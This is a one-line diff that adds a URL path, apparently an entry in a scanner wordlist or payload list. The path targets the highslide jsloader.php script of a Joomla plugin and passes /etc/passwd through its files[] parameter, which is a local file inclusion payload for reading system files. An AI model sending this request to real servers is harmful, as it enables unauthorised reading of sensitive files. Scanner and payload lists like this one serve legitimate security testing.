@@ -1,0 +1,1 @@
+/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
